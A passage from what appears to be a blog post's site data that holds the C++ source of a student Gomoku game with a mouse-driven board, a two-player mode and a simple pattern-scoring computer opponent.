0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 3; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x + j * dir[i][0]][y + j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 1) && !a && !b)\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 40;\n\t\t\telse white[x][y] += 40;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool death2(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 3; j++)\n\t\t{\n\t\t\tif (!flag1 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 1) && (a || b) && (a != b))\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 30;\n\t\t\telse white[x][y] += 30;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nvoid AI()\n{\n\tint b_x = 8, b_y = 8, w_x = 8, w_y = 8;\n\tmemset(black, 0, sizeof(black));\n\tmemset(white, 0, sizeof(white));\n\tfor (int i = 1; i <= 15; i++)\n\t{\n\t\tfor (int j = 1; j <= 15; j++)\n\t\t{\n\t\t\tif (!pos[i][j])\n\t\t\t{\n\t\t\t\tpos[i][j] = -1;\n\t\t\t\twhile (true)\n\t\t\t\t{\n\t\t\t\t\tif (lian5(i, j))break;\n\t\t\t\t\tif (live4(i, j))break;\n\t\t\t\t\tif (live3(i, j))break;\n\t\t\t\t\tif (chong4(i, j))break;\n\t\t\t\t\tif (death3(i, j))break;\n\t\t\t\t\tif (live2(i, j))break;\n\t\t\t\t\tif (death2(i, j))break;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tpos[i][j] = 1;\n\t\t\t\twhile (true)\n\t\t\t\t{\n\t\t\t\t\tif (lian5(i, j))break;\n\t\t\t\t\tif (live4(i, j))break;\n\t\t\t\t\tif (live3(i, j))break;\n\t\t\t\t\tif (chong4(i, j))break;\n\t\t\t\t\tif (death3(i, j))break;\n\t\t\t\t\tif (live2(i, j))break;\n\t\t\t\t\tif (death2(i, j))break;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tpos[i][j] = 0;\n\t\t\t\tif (black[i][j] > black[b_x][b_y])b_x = i, b_y = j;\n\t\t\t\tif (white[i][j] > white[w_x][w_y])w_x = i, w_y = j;\n\t\t\t}\n\t\t}\n\t}\n\tSleep(1000);\n\tif (black[b_x][b_y] <= white[w_x][w_y])Play(w_x + 2, w_y, 1);\n\telse Play(b_x + 2, b_y, 1);\n\treturn;\n}\nvoid GameAI()\n{\n\tint turn = 0;\n\tkey = false;\n\tmemset(pos, 0, sizeof(pos));\n\t/*setfillcolor(EGERGB(0, 0, 0));\n\tbar(10, 200, 90, 230);\n\tsetcolor(EGERGB(0, 0, 255));\n\tsetfont(20, 0, \"宋体\");\n\txyprintf(10, 205, \"玩家先手\");*/\n\tmouse_msg msg;\n\tbool flag = true;\n\tfor (; is_run();)\n\t{\n\t\tmsg = getmouse();\n\t\tif (msg.is_up())\n\t\t{\n\t\t\t/*if (flag)//flag标记是否开始游戏\n\t\t\t{\n\t\t\t\tif (msg.x >= 10 && msg.x <= 90 && msg.y >= 200 && msg.y <= 230)\n\t\t\t\t{\n\t\t\t\t\tsetfillcolor(EGERGB(0, 0, 0));\n\t\t\t\t\tbar(10, 200, 90, 230);\n\t\t\t\t\tsetcolor(EGERGB(0, 0, 255));\n\t\t\t\t\tsetfont(20, 0, \"宋体\");\n\t\t\t\t\txyprintf(10, 205, \"电脑先手\");\n\t\t\t\t\tflag = false;\n\t\t\t\t}\n\t\t\t}*/\n\t\t\tif (msg.x % 40 < 20)\n\t\t\t{\n\t\t\t\tif (msg.y % 40 < 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40, msg.y / 40, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t\tif (Checker())break;\n\t\t\t\t\t\tAI();\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (msg.y % 40 > 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40, msg.y / 40 + 1, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t\tif (Checker())break;\n\t\t\t\t\t\tAI();\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (msg.x % 40 > 20)\n\t\t\t{\n\t\t\t\tif (msg.y % 40 < 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40 + 1, msg.y / 40, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t\tif (Checker())break;\n\t\t\t\t\t\tAI();\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (msg.y % 40 > 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40 + 1, msg.y / 40 + 1, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t\tif (Checker())break;\n\t\t\t\t\t\tAI();\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (Checker())break;\n\t\t}\n\t}\n}\nvoid GamePeople()\n{\n\tkey = true;\n\tmemset(pos, 0, sizeof(pos));\n\tint turn = 0;\n\tmouse_msg msg;\n\tfor (; is_run();)\n\t{\n\t\tmsg = getmouse();\n\t\tif (msg.is_up())\n\t\t{\n\t\t\tif (msg.x % 40 < 20)\n\t\t\t{\n\t\t\t\tif (msg.y % 40 < 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40, msg.y / 40, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (msg.y % 40 > 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40, msg.y / 40 + 1, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\telse if (msg.x % 40 > 20)\n\t\t\t{\n\t\t\t\tif (msg.y % 40 < 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40 + 1, msg.y / 40, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse if (msg.y % 40 > 20)\n\t\t\t\t{\n\t\t\t\t\tif (Play(msg.x / 40 + 1, msg.y / 40 + 1, turn % 2))\n\t\t\t\t\t{\n\t\t\t\t\t\tturn++;\n\t\t\t\t\t\tCounter(turn);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (Checker())break;\n\t\t}\n\t}\n}\nbool Menu()\n{\n\tsetcolor(EGERGB(255, 45, 50));\n\tsetfont(130, 0, \"华文新魏\");\n\txyprintf(150, 60, \"五  子  棋\");\n\tsetbkcolor(EGERGB(0, 0, 255));\n\tsetfillcolor(EGERGB(0, 122, 204));\n\tbar(300, 230, 500, 280);\n\tbar(300, 300, 500, 350);\n\tbar(300, 370, 500, 420);\n\tsetbkmode(TRANSPARENT);\n\tsetfont(40, 15, \"华文楷体\");\n\tsetcolor(EGERGB(255, 255, 255));\n\tsetfontbkcolor(EGERGB(30, 30, 130));\n\touttextxy(320, 235, \"人机对战\");\n\touttextxy(320, 305, \"好友对战\");\n\touttextxy(320, 375, \"退出游戏\");\n\tsetfont(30, 0, \"华文楷体\");\n\touttextxy(230, 480, \"制作人：计实验17-1郭永航\");\n\tsetfont(20, 0, \"方正舒体\");\n\tsetcolor(EGERGB(0, 0, 0));\n\touttextxy(190, 600, \"Copyright (C) 2018 Gomoku. All Rights Reserved.\");\n\tmouse_msg msg;\n\tfor (; is_run();)\n\t{\n\t\tmsg = getmouse();\n\t\tif (msg.is_up())\n\t\t{\n\t\t\tif (msg.x >= 300 && msg.x <= 500 && msg.y >= 230 && msg.y <= 280)\n\t\t\t{\n\t\t\t\tcleardevice();\n\t\t\t\tChessBoard();\n\t\t\t\tGameAI();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (msg.x >= 300 && msg.x <= 500 && msg.y >= 300 && msg.y <= 350)\n\t\t\t{\n\t\t\t\tcleardevice();\n\t\t\t\tChessBoard();\n\t\t\t\tGamePeople();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (msg.x >= 300 && msg.x <= 500 && msg.y >= 370 && msg.y <= 420)\n\t\t\t{\n\t\t\t\tclosegraph();\n\t\t\t\treturn 1;\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\nbool Choice()\n{\n\tsetfillcolor(EGERGB(0, 0, 0));\n\tbar(10, 150, 90, 180);\n\tbar(10, 200, 90, 230);\n\tsetcolor(EGERGB(255, 255, 255));\n\tsetfont(20, 0, \"宋体\");\n\txyprintf(10, 155, \"再来一局\");\n\txyprintf(10, 205, \"返回菜单\");\n\tmouse_msg msg;\n\tfor (; is_run();)\n\t{\n\t\tmsg = getmouse();\n\t\tif (msg.is_up())\n\t\t{\n\t\t\tif (msg.x >= 10 && msg.x <= 90 && msg.y >= 150 && msg.y <= 180)\n\t\t\t{\n\t\t\t\tcleardevice();\n\t\t\t\tChessBoard();\n\t\t\t\tif (key)GamePeople();\n\t\t\t\telse GameAI();\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse if (msg.x >= 10 && msg.x <= 90 && msg.y >= 200 && msg.y <= 230)\n\t\t\t{\n\t\t\t\tcleardevice();\n\t\t\t\tif (Menu())return 1;\n\t\t\t\telse break;\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\nint main()\n{\n\tsetinitmode(INIT_RENDERMANUAL);\n\tinitgraph(800, 640);\n\tsetcaption(\"五子棋\");\n\tif (Menu())return 0;\n\twhile (!Choice());\n\treturn 0;\n}\n```","source":"_posts/Gomoku.md","raw":"---\ntitle: 五子棋\ndate: 2020-04-08 16:08:24\ncategories:\n  - 编程语言\n  - C++\nmathjax: true\ntags: GUI\nabbrlink: fc33752b\n---\n> C++课程设计作业，包含人工智障$AI$\n\n<!--more-->\n```cpp\n#include<graphics.h>\nint pos[20][20];//\t1●\t\t-1○\t\t0×\nint black[20][20], white[20][20];\nint dir[4][2] = { {-1,-1},{-1,0},{-1,1},{0,-1} };\nbool key;\nvoid End(int n)\n{\n\tsetfont(80, 0, \"宋体\");\n\tif (n == 1)xyprintf(240, 245, \"黑方获胜\");\n\telse xyprintf(240, 245, \"白方获胜\");\n\treturn;\n}\nbool Checker()\n{\n\tsetcolor(EGERGB(255, 0, 0));\n\tfor (int i = 1; i < 12; i++)\n\t{\n\t\tfor (int j = 1; j < 12; j++)\n\t\t{\n\t\t\tif (pos[i][j])\n\t\t\t{\n\t\t\t\tbool flag = true;\n\t\t\t\tfor (int p = 0; p < 5; p++)\n\t\t\t\t\tif (pos[i][j] != pos[i][j + p])\n\t\t\t\t\t{\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tif (flag)\n\t\t\t\t{\n\t\t\t\t\tline(i * 40 + 80, j * 40, i * 40 + 80, (j + 4) * 40);\n\t\t\t\t\tEnd(pos[i][j]);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t\tflag = true;\n\t\t\t\tfor (int p = 0; p < 5; p++)\n\t\t\t\t\tif (pos[i][j] != pos[i + p][j + p])\n\t\t\t\t\t{\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tif (flag)\n\t\t\t\t{\n\t\t\t\t\tline(i * 40 + 80, j * 40, (i + 4) * 40 + 80, (j + 4) * 40);\n\t\t\t\t\tEnd(pos[i][j]);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t\tflag = true;\n\t\t\t\tfor (int p = 0; p < 5; p++)\n\t\t\t\t\tif (pos[i][j] != pos[i + p][j])\n\t\t\t\t\t{\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tif (flag)\n\t\t\t\t{\n\t\t\t\t\tline(i * 40 + 80, j * 40, (i + 4) * 40 + 80, j * 40);\n\t\t\t\t\tEnd(pos[i][j]);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tfor (int i = 5; i <= 15; i++)\n\t{\n\t\tfor (int j = 1; j < 12; j++)\n\t\t{\n\t\t\tif (pos[i][j])\n\t\t\t{\n\t\t\t\tbool flag = true;\n\t\t\t\tfor (int p = 0; p < 5; p++)\n\t\t\t\t\tif (pos[i][j] != pos[i - p][j + p])\n\t\t\t\t\t{\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\tif (flag)\n\t\t\t\t{\n\t\t\t\t\tline(i * 40 + 80, j * 40, (i - 4) * 40 + 80, (j + 4) * 40);\n\t\t\t\t\tEnd(pos[i][j]);\n\t\t\t\t\treturn true;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn false;\n}\nvoid ChessBoard()\n{\n\tsetbkcolor(EGERGB(199, 156, 124));\n\tsetcolor(EGERGB(0, 0, 0));\n\tfor (int i = 120; i <= 680; i += 40)\n\t{\n\t\tline(120, i - 80, 680, i - 80);\t//X\t120-680\n\t\tline(i, 40, i, 600);\t\t\t//Y\t40-600\n\t}\n\tsetfillcolor(EGERGB(0, 0, 0));\n\tbar(240 - 4, 160 - 4, 240 + 4, 160 + 4);\n\tbar(240 - 4, 480 - 4, 240 + 4, 480 + 4);\n\tbar(560 - 4, 160 - 4, 560 + 4, 160 + 4);\n\tbar(560 - 4, 480 - 4, 560 + 4, 480 + 4);\n\tbar(400 - 4, 320 - 4, 400 + 4, 320 + 4);\n\tsetfont(10, 0, \"黑体\");\n\tfor (int i = 40; i <= 600; i += 40)\n\t{\n\t\txyprintf(100, i - 3, \"%d\", (int)(i / 40));\n\t\txyprintf(i + 78, 20, \"%c\", (char)(i / 40 + 'A' - 1));\n\t}\n\tsetcolor(EGERGB(255, 0, 0));\n\tsetfont(20, 0, \"宋体\");\n\txyprintf(10, 40, \"当前子数\");\n\tsetcolor(EGERGB(0, 0, 0));\n\txyprintf(10, 70, \"黑: 0\");\n\tsetcolor(EGERGB(255, 255, 255));\n\txyprintf(10, 100, \"白: 0\");\n\treturn;\n}\nvoid Chess(int x, int y, int color)\n{\n\tif (color % 2)\n\t{\n\t\tsetcolor(EGERGB(255, 255, 255));\n\t\tsetfillcolor(EGERGB(255, 255, 255));\n\t\tfillellipse(x, y, 15, 15);\n\t}\n\telse\n\t{\n\t\tsetcolor(EGERGB(0, 0, 0));\n\t\tsetfillcolor(EGERGB(0, 0, 0));\n\t\tfillellipse(x, y, 15, 15);\n\t}\n}\nbool Play(int x, int y, int color)//color: 0●  1○\n{\n\tx -= 2;\n\tif (x >= 1 && x <= 15 && y >= 1 && y <= 15)\n\t{\n\t\tif (!pos[x][y])\n\t\t{\n\t\t\tChess(x * 40 + 80, y * 40, color);\n\t\t\tif (color)pos[x][y] = -1;\n\t\t\telse pos[x][y] = 1;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nvoid Counter(int n)\n{\n\tsetfillcolor(EGERGB(199, 156, 124));\n\tbar(50, 60, 70, 120);\n\tif (n % 2)\n\t{\n\t\tsetcolor(EGERGB(0, 0, 0));\n\t\txyprintf(50, 70, \"%d\", (n + 1) / 2);\n\t\tsetcolor(EGERGB(255, 255, 255));\n\t\txyprintf(50, 100, \"%d\", n / 2);\n\t\tbar(0, 140, 100, 180);\n\t\txyprintf(10, 150, \"白方执棋\");\n\t}\n\telse\n\t{\n\t\tsetcolor(EGERGB(0, 0, 0));\n\t\txyprintf(50, 70, \"%d\", n / 2);\n\t\tsetcolor(EGERGB(255, 255, 255));\n\t\txyprintf(50, 100, \"%d\", (n + 1) / 2);\n\t\tbar(0, 140, 100, 180);\n\t\tsetcolor(EGERGB(0, 0, 0));\n\t\txyprintf(10, 150, \"黑方执棋\");\n\t}\n}\nbool lian5(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 5; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif (ans >= 4)\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 100;\n\t\t\telse white[x][y] += 100;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool live4(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 5; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x + j * dir[i][0]][y + j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 3) && !a && !b)\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 80;\n\t\t\telse white[x][y] += 80;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool chong4(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 5; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x + j * dir[i][0]][y + j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 3) && (a || b) && (a != b))\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 60;\n\t\t\telse white[x][y] += 60;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool live3(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 4; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x + j * dir[i][0]][y + j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 2) && !a && !b)\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 70;\n\t\t\telse white[x][y] += 70;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool death3(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 4; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x + j * dir[i][0]][y + j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 2) && (a || b) && (a != b))\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 50;\n\t\t\telse white[x][y] += 50;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool live2(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 3; j++)\n\t\t{\n\t\t\tif (!flag1 && (x + j * dir[i][0] > 0) && (x + j * dir[i][0] < 16) && (y + j * dir[i][1] > 0) && (y + j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x + j * dir[i][0]][y + j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x + j * dir[i][0]][y + j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 1) && !a && !b)\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 40;\n\t\t\telse white[x][y] += 40;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool death2(int x, int y)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint ans = 0, a = 1, b = 1, flag1 = 0, flag2 = 0;\n\t\tfor (int j = 1; j < 3; j++)\n\t\t{\n\t\t\tif (!flag1 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\ta = 0, flag1 = 1;\n\t\t\t}\n\t\t\tif (!flag2 && (x - j * dir[i][0] > 0) && (x - j * dir[i][0] < 16) && (y - j * dir[i][1] > 0) && (y - j * dir[i][1] < 16))\n\t\t\t{\n\t\t\t\tif (pos[x][y] == pos[x - j * dir[i][0]][y - j * dir[i][1]])\n\t\t\t\t\tans++;\n\t\t\t\telse if (pos[x - j * dir[i][0]][y - j * dir[i][1]] == 0)\n\t\t\t\t\tb = 0, flag2 = 1;\n\t\t\t}\n\t\t}\n\t\tif ((ans >= 1) && (a || b) && (a != b))\n\t\t{\n\t\t\tif (pos[x][y] == 1)black[x][y] += 30;\n\t\t\telse white[x][y] += 30;\n\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nvoid AI()\n{\n\tint b_x = 8, b_y = 8, w_x = 8, w_y = 8;\n\tmemset(black, 0, sizeof(black));\n\tmemset(white, 0, sizeof(white));\n\tfor (int i = 1; i <= 15; i++)\n\t{\n\t\tfor (int j = 1; j <= 15; j++)\n\t\t{\n\t\t\tif (!pos[i][j])\n\t\t\t{\n\t\t\t\tpos[i][j] = -1;\n\t\t\t\twhile (true)\n\t\t\t\t{\n\t\t\t\t\tif (lian5(i, j))break;\n\t\t\t\t\tif (live4(i, j))break;\n\t\t\t\t\tif (live3(i, j))break;\n\t\t\t\t\tif (chong4(i, j))break;\n\t\t\t\t\tif (death3(i, j))break;\n\t\t\t\t\tif (live2(i, j))break;\n\t\t\t\t\tif (death2(i, j))break;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tpos[i][j] = 1;\n\t\t\t\twhile (true)\n\t\t\t\t{\n\t\t\t\t\tif (lian5(i, j))break;\n\t\t\t\t\tif (live4(i, j))break;\n\t\t\t\t\tif (live3(i, j))break;\n\t\t\t\t\tif (chong4(i, j))break;\n\t\t\t\t\tif (death3(i, j))break;\n\t\t\t\t\tif (live2(i, j))break;\n\t\t\t\t\tif (death2(i, j))break;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tpos[i][j] = 0;\n\t\t\t\tif (black[i][j] > black[b_x][b_y])b_x = i, b_y = j;\n\t\t\t\tif (white[i][j] > white[w_x][w_y])w_x = i, w_y = j;\n\t\t\t}\n\t\t}\n\t}\n\tSleep(1000);\n\tif (black[b_x][b_y] <= white[w_x][w_y])Play(w_x + 2, w_y, 1);\n\telse Play(b_x + 2, b_y, 